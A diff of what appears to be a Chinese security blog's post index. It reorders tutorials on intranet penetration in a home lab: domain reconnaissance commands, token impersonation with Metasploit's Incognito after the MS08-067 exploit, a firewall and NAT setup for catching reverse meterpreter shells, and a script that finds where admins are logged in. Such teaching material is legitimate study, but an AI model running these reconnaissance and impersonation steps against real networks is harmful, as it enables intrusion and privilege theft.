+<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>为了验证我们的流量还有真实IP是否得到真实的隐藏，我们中间再插入一台新的主机，里面使用wireshark对流量数据包进行监听，网段设置一定要和内网数据库主机(<code>104</code>网段)的主机一致。<br><img src="https://img-blog.csdnimg.cn/20210325110645479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们在win7的那个meterpreter上执行arp扫描，在上面一台主机上观察数据包的流量变化<br><img src="https://img-blog.csdnimg.cn/20210325111454791.png" alt="在这里插入图片描述"><br>可以看到，都是win7和win2003主机之间的通信，我们真实的主机IP得到了很好的隐藏<br><img src="https://img-blog.csdnimg.cn/20210325111539446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 ]]></content>
       <categories>
         <category>内网渗透</category>
@@ -316,52 +289,24 @@
       </tags>
   </entry>
   <entry>
-    <title>域内信息收集</title>
-    <url>/2021/03/09/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在内网渗透中，我们必须要快速地对内网信息进行多方面的信息收集，因此我们需要用到一些常用的命令或者是工具对内网域控制器或者管理员进行快速地定位</p>
-<h2 id="工具的使用"><a href="#工具的使用" class="headerlink" title="工具的使用"></a>工具的使用</h2><blockquote>
-<p><strong>net config workstation：查询当前登录域及登录用户信息</strong></p>
-</blockquote>
-<p>“登录域”用于表示当前登录的用户是域用户还是本地用户</p>
-<p><img src="https://img-blog.csdnimg.cn/20210309171809630.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<blockquote>
-<p><strong>net time /domain：判断主域(域服务器通常会同时作为时间服务器使用)</strong></p>
-</blockquote>
-<p>执行命令后有三种情况，因为条件原因我这里只显示一种情况</p>
-<p>存在域，但当前用户不是域用户<br>存在域，且当前用户是域用户<br><img src="https://img-blog.csdnimg.cn/20210309172224207.png" alt="在这里插入图片描述"><br>当前网络环境为工作组，不存在域</p>
-<blockquote>
-<p><strong>for /L %I in (3,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL=”：利用ICMP协议快速探测内网</strong></p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/2021030917381328.png" alt="在这里插入图片描述"></p>
-<blockquote>
-<p><strong>net group /domain：查询域内所有用户组列表</strong></p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/2021030917411554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<blockquote>
-<p><strong>net group “domain computers” /domain：查询所有域成员计算机列表</strong></p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210309174225725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<blockquote>
-<p><strong>net user /domain：向域控制器进行查询</strong></p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210309174445840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其中krbtgt用户不仅可以创建票据授权服务(TGS)的加密密钥，还可以实现多种域内权限持久化方法</p>
-<blockquote>
-<p><strong>wmic useraccount get /all：获取域内用户的详细信息，常见参数包括用户名、描述信息，SID，域名，状态等</strong></p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210309174625154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<blockquote>
-<p><strong>dsquery user：查看存在的用户，目前发现只能在域控里使用这命令</strong></p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/2021030917480369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<blockquote>
-<p><strong>net group “domain admins” /domain：查询域管理员用户，这个命令非常非常重要！！！！</strong></p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210309174931906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<blockquote>
-<p><strong>net group “Enterprise Admins” /domain：查询管理员用户组</strong></p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210309175032561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="更多学习资料请关注我的个人博客"><a href="#更多学习资料请关注我的个人博客" class="headerlink" title="更多学习资料请关注我的个人博客"></a>更多学习资料请关注我的个人博客</h2><p><a href="https://pyhsecurity.cn/">https://pyhsecurity.cn/</a></p>
+    <title>令牌假冒</title>
+    <url>/2021/03/21/%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/</url>
+    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>假冒令牌可以假冒一个网络中的另一个用户进行各种操作。令牌包括登录会话的安全信息，如用户身份识别、用户组合用户权限。当一个用户登录Windows系统时，它被给定一个访问令牌作为它认证会话的一部分。例如，一个入侵用户可能需要以域管理员处理一个特定任务，当它使用令牌便可假冒域管理员进行工作。</p>
+<h2 id="Windows安全相关概念"><a href="#Windows安全相关概念" class="headerlink" title="Windows安全相关概念"></a>Windows安全相关概念</h2><ul>
+<li>Session</li>
+<li>Windows Station</li>
+<li>Desktop</li>
+<li>Login Session：不同账号登录产生不同的登录Session，代表不同的账号权限</li>
+</ul>
+<h2 id="Tokens"><a href="#Tokens" class="headerlink" title="Tokens"></a>Tokens</h2><ul>
+<li>Tokens与进程相关联，进程创建时根据Login Session分配对应Token，含有该进程用户账号、组信息、权限信息等。</li>
+<li>用户每次登录，产生Login Session分配对应Token</li>
+<li>访问资源时提交Token进行身份验证，类似于Web Cookie</li>
+<li>Delegate Token：交互登录会话</li>
+<li>Impersonate Token：非交互登录会话<span id="more"></span>
+<h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2>首先我们得构造一个域环境，这里我已经搭建完成了，不懂的小伙伴请自行百度。然后我们关闭Windows XP的防火墙，利用经典的缓冲区溢出漏洞<code>MS08_067</code>漏洞获取shell。<br><img src="https://img-blog.csdnimg.cn/20210319230852823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><!--more-->
+加载<code>Incognito</code>模块，重要的是<code>impersonate_token</code>和<code>list_tokens</code>这两个模块，前者是伪造域管理员或者更高权限的令牌，后者是列出当前计算机都有哪些计算机访问过留下的token值<br><img src="https://img-blog.csdnimg.cn/20210319231232492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021031923145549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们尝试使用域控用共享的方式访问XP主机的C盘<br><img src="https://img-blog.csdnimg.cn/20210319231602521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功捕获到域管理员的令牌<br><img src="https://img-blog.csdnimg.cn/20210319231704464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后使用<code>impersonate_token</code>命令假冒域管理员，因为单斜杠会被转义，所以要换成双斜杠，可以看到我们当前的权限变为域管理员权限<br><img src="https://img-blog.csdnimg.cn/20210319231835906.png" alt="在这里插入图片描述"><br>然后我们就能进入shell执行各种恶意操作了<br><img src="https://img-blog.csdnimg.cn/20210319232030942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
+</ul>
 ]]></content>
       <categories>
         <category>内网渗透</category>
@@ -520,6 +465,61 @@
 <p><img src="https://img-blog.csdnimg.cn/20210307213755137.png" alt="在这里插入图片描述"><br>以下脚本作用类似于nbtscan工具</p>
 <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /F %i <span class="keyword">in</span> (dcs.txt) <span class="keyword">do</span> @<span class="built_in">echo</span> [+] Checking %i &amp;&amp; nbtscan <span class="operator">-f</span> %i <span class="number">2</span>&gt;NUL &gt;nbsessions.txt &amp;&amp; <span class="keyword">FOR</span> /F %n <span class="keyword">in</span> (admins.txt) <span class="keyword">DO</span> @<span class="built_in">type</span> nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; <span class="built_in">echo</span> [!] %n was found logged into %i</span><br></pre></td></tr></table></figure>
 <p><img src="https://img-blog.csdnimg.cn/20210307213858148.png" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>红蓝对抗</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>域内信息收集</title>
+    <url>/2021/03/09/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在内网渗透中，我们必须要快速地对内网信息进行多方面的信息收集，因此我们需要用到一些常用的命令或者是工具对内网域控制器或者管理员进行快速地定位</p>
+<h2 id="工具的使用"><a href="#工具的使用" class="headerlink" title="工具的使用"></a>工具的使用</h2><blockquote>
+<p><strong>net config workstation：查询当前登录域及登录用户信息</strong></p>
+</blockquote>
+<p>“登录域”用于表示当前登录的用户是域用户还是本地用户</p>
+<p><img src="https://img-blog.csdnimg.cn/20210309171809630.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<blockquote>
+<p><strong>net time /domain：判断主域(域服务器通常会同时作为时间服务器使用)</strong></p>
+</blockquote>
+<p>执行命令后有三种情况，因为条件原因我这里只显示一种情况</p>
+<p>存在域，但当前用户不是域用户<br>存在域，且当前用户是域用户<br><img src="https://img-blog.csdnimg.cn/20210309172224207.png" alt="在这里插入图片描述"><br>当前网络环境为工作组，不存在域</p>
+<blockquote>
+<p><strong>for /L %I in (3,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL=”：利用ICMP协议快速探测内网</strong></p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/2021030917381328.png" alt="在这里插入图片描述"></p>
+<blockquote>
+<p><strong>net group /domain：查询域内所有用户组列表</strong></p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/2021030917411554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<blockquote>
+<p><strong>net group “domain computers” /domain：查询所有域成员计算机列表</strong></p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210309174225725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<blockquote>
+<p><strong>net user /domain：向域控制器进行查询</strong></p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210309174445840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其中krbtgt用户不仅可以创建票据授权服务(TGS)的加密密钥，还可以实现多种域内权限持久化方法</p>
+<blockquote>
+<p><strong>wmic useraccount get /all：获取域内用户的详细信息，常见参数包括用户名、描述信息，SID，域名，状态等</strong></p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210309174625154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<blockquote>
+<p><strong>dsquery user：查看存在的用户，目前发现只能在域控里使用这命令</strong></p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/2021030917480369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<blockquote>
+<p><strong>net group “domain admins” /domain：查询域管理员用户，这个命令非常非常重要！！！！</strong></p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210309174931906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<blockquote>
+<p><strong>net group “Enterprise Admins” /domain：查询管理员用户组</strong></p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210309175032561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="更多学习资料请关注我的个人博客"><a href="#更多学习资料请关注我的个人博客" class="headerlink" title="更多学习资料请关注我的个人博客"></a>更多学习资料请关注我的个人博客</h2><p><a href="https://pyhsecurity.cn/">https://pyhsecurity.cn/</a></p>
 ]]></content>
       <categories>
         <category>内网渗透</category>
@@ -695,30 +695,6 @@
       </categories>
       <tags>
         <tag>二进制逆向</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>真实的内网环境搭建</title>
-    <url>/2021/03/25/%E7%9C%9F%E5%AE%9E%E7%9A%84%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<h2 id="网络拓扑图及通信原理"><a href="#网络拓扑图及通信原理" class="headerlink" title="网络拓扑图及通信原理"></a>网络拓扑图及通信原理</h2><p><img src="https://img-blog.csdnimg.cn/20210320230449202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>假如我们的笔记本代表我们的宿主机Kali，旁边的是我们自己公司的防火墙，云代表互联网，对面的是对面公司的防火墙和内网服务器，分别是win7和Windows Server2003。</p>
-<p>现在我们要对其内网进行渗透攻击，那么我们就必须要获得对面主机反弹回来的meterpreter shell，我们有两种方式，一种是通过VPS代理的方式接收反弹回来的shell；另一种是通过设置防火墙的NAT映射，将IP地址进行映射从而接收反弹的shell连接。</p>
-<span id="more"></span>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先我们先安装win7和windows server2003，并添加一个VMnet2虚拟网络，VMnet2和VMnet1的IP地址设置为动态获得。<br><img src="https://img-blog.csdnimg.cn/20210320231302827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>windows7</strong><br><img src="https://img-blog.csdnimg.cn/20210320233341719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>windows server2003</strong><br><img src="https://img-blog.csdnimg.cn/20210320233413526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Kali</strong><br><img src="https://img-blog.csdnimg.cn/20210320233447842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<!--more-->
-
-<p>然后安装monowall软路由防火墙，这节必须跟着步骤一步步来，不然很难配置好。(反正我就折腾了一天 ╮(╯▽╰)╭)</p>
-<p>这是monowall的下载地址，我们要下载的是iso镜像文件<br><a href="https://archiveos.org/monowall/">https://archiveos.org/monowall/</a><br><img src="https://img-blog.csdnimg.cn/20210320231702299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后新建虚拟机，选择FreeBSD和更早的版本(这里最好是选32位的)<br><img src="https://img-blog.csdnimg.cn/20210320231847317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/202103202319019.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>新建完成后，跟着这位大佬的操作一步步来，因为太多细节了，这里也说不完，配置好的mono01和mono02分别如下图所示<br><a href="https://blog.csdn.net/tluio/article/details/81292992">https://blog.csdn.net/tluio/article/details/81292992</a></p>
-<p><strong>mono01</strong><br><img src="https://img-blog.csdnimg.cn/20210320232817531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210320233238948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><strong>mono02</strong><br><img src="https://img-blog.csdnimg.cn/20210320232851327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210320233253742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>tips：这里稍微提醒下就是，必须得划分vlan才能对网卡进行选择，要不然外网的WAN不能识别网卡(WAN那块一直显示sis1 ╮(╯▽╰)╭)，至于为什么我也不知道，欢迎大佬评论解释！LAN对应的是内网网卡，WAN对应的是外网网卡，选择桥接模式。</p>
-<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>首先是对我们自己公司的防火墙也就是<strong>mono01</strong>进行配置，LAN那个保持默认就好，我们得添加NAT规则和外网转发策略<br><img src="https://img-blog.csdnimg.cn/20210320233950438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>取消掉这个选项，因为他屏蔽了类似192.168的网段的连接，点击save<br><img src="https://img-blog.csdnimg.cn/20210320234159252.png" alt="在这里插入图片描述"></p>
-<p>NAT规则的设置，设置完成记得点保存！！！<br><img src="https://img-blog.csdnimg.cn/20210320234427762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后接着我们设置<strong>mono02</strong>的配置，mono02的配置较简单，只需将Block选项取消掉即可<br><img src="https://img-blog.csdnimg.cn/20210320234644747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>为了检验最后的效果，我们在kali上开启一个服务器，监听的端口号为4444<br><img src="https://img-blog.csdnimg.cn/20210320234947351.png" alt="在这里插入图片描述"><br>在win7上访问mono01的公网IP，显示连接成功即搭建成功！！！<br><img src="https://img-blog.csdnimg.cn/20210320235029633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>红蓝对抗</tag>
       </tags>
   </entry>
   <entry>
@@ -909,6 +885,30 @@
       </categories>
       <tags>
         <tag>二进制逆向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>真实的内网环境搭建</title>
+    <url>/2021/03/25/%E7%9C%9F%E5%AE%9E%E7%9A%84%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<h2 id="网络拓扑图及通信原理"><a href="#网络拓扑图及通信原理" class="headerlink" title="网络拓扑图及通信原理"></a>网络拓扑图及通信原理</h2><p><img src="https://img-blog.csdnimg.cn/20210320230449202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>假如我们的笔记本代表我们的宿主机Kali，旁边的是我们自己公司的防火墙，云代表互联网，对面的是对面公司的防火墙和内网服务器，分别是win7和Windows Server2003。</p>
+<p>现在我们要对其内网进行渗透攻击，那么我们就必须要获得对面主机反弹回来的meterpreter shell，我们有两种方式，一种是通过VPS代理的方式接收反弹回来的shell；另一种是通过设置防火墙的NAT映射，将IP地址进行映射从而接收反弹的shell连接。</p>
+<span id="more"></span>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先我们先安装win7和windows server2003，并添加一个VMnet2虚拟网络，VMnet2和VMnet1的IP地址设置为动态获得。<br><img src="https://img-blog.csdnimg.cn/20210320231302827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>windows7</strong><br><img src="https://img-blog.csdnimg.cn/20210320233341719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>windows server2003</strong><br><img src="https://img-blog.csdnimg.cn/20210320233413526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Kali</strong><br><img src="https://img-blog.csdnimg.cn/20210320233447842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<!--more-->
+
+<p>然后安装monowall软路由防火墙，这节必须跟着步骤一步步来，不然很难配置好。(反正我就折腾了一天 ╮(╯▽╰)╭)</p>
+<p>这是monowall的下载地址，我们要下载的是iso镜像文件<br><a href="https://archiveos.org/monowall/">https://archiveos.org/monowall/</a><br><img src="https://img-blog.csdnimg.cn/20210320231702299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后新建虚拟机，选择FreeBSD和更早的版本(这里最好是选32位的)<br><img src="https://img-blog.csdnimg.cn/20210320231847317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/202103202319019.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>新建完成后，跟着这位大佬的操作一步步来，因为太多细节了，这里也说不完，配置好的mono01和mono02分别如下图所示<br><a href="https://blog.csdn.net/tluio/article/details/81292992">https://blog.csdn.net/tluio/article/details/81292992</a></p>
+<p><strong>mono01</strong><br><img src="https://img-blog.csdnimg.cn/20210320232817531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210320233238948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
